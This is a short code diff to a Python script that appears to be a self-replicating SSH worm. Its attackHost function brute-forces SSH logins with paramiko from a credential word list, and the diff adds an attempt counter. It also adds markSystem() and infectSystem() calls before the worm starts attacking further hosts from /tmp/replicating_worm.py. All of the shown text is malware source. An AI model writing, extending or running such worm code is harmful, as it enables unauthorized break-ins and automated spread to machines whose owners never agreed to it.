@@ -74,12 +74,16 @@ def attackHost(host):
 	# Set some parameters to make things easier.
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
+	numTries = 0
+
 	for (_username, _password) in wordList:
 		try:
 			ssh.connect(host, username=_username, password=_password)
 			return (ssh, _username, _password)
 		except:
-			print("")
+			numTries = numTries + 1
+
+	print("Number of attempts before correct connect: %d" %(numTries))
 
 	return None
 
@@ -123,6 +127,8 @@ def main(argv):
 			print("Don't understand argument!!\nTry again please")
 	else:
 		if isTargetInfected() == False:
+			markSystem()
+			infectSystem()
 			startAttacking("/tmp/replicating_worm.py", False)
 	
 
